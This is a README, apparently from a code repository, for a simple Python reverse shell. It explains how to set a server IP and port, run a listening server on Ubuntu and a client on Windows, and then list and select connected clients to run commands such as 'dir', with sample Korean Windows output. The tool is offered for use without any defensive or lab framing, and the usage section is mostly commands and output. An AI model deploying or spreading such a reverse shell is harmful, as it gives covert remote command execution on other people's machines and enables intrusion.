# Reverse shell

Simple python rverse shell 


# Edit the file
  >edit client.py 
  
          host = '192.168.10.10'   //input server ip
          port = 44444   //input server port

  >edit server.py 
  
          port = 44444   //input port to allow


 # Usage
  >Run server to open the port and wait (Ubuntu 16.04 & python3.5)
  
        python3 server.py
        server>
      
      
  >Run client (Windows10 & python3.5)
  
        python3 client.py


  >When the client is executed, use the command on the server
  
        >list
        Connected Clients:
          | IP Address   | Port number
        0 | 192.168.0.10 | 52784 
        
        >select 0
        You are now connected 192.168.10.10
        
        >192.168.10.10>dir
        C 드라이브의 볼륨에는 이름이 없습니다.
        볼륨 일련 번호: OOOOOO

        C:\Users\OOOOO 디렉터리

        2018-03-24  오후 04:25    <DIR>          OOOO
        2018-03-24  오후 04:25    <DIR>          OOOOO

